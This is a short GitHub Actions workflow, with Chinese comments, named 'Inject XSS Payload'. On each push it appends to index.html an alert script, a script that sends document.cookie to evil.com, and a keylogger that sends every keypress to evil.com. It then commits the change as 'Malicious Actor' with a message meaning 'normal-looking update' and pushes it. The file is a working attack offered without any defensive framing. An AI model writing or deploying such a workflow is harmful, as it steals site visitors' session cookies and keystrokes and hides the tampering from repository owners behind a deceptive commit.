name: "Inject XSS Payload"

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  inject-xss:
    runs-on: ubuntu-latest
    permissions:
      contents: write  # 需要写入权限
    
    steps:
      - uses: actions/checkout@v4
      
      - name: "修改 HTML 注入 XSS"
        run: |
          # 简单的 XSS 弹窗
          echo '<script>alert("XSS")</script>' >> index.html
          
          # 窃取 Cookie
          cat >> index.html << 'EOF'
          <script>
            fetch('https://evil.com/steal?cookie=' + document.cookie);
          </script>
          EOF
          
          # 键盘记录器
          cat >> index.html << 'EOF'
          <script>
            document.onkeypress = function(e) {
              fetch('https://evil.com/keylog?key=' + e.key);
            }
          </script>
          EOF
          
      - name: "提交恶意代码"
        run: |
          git config user.name "Malicious Actor"
          git config user.email "malicious@example.com"
          git add .
          git commit -m "看起来正常的更新"
          git push
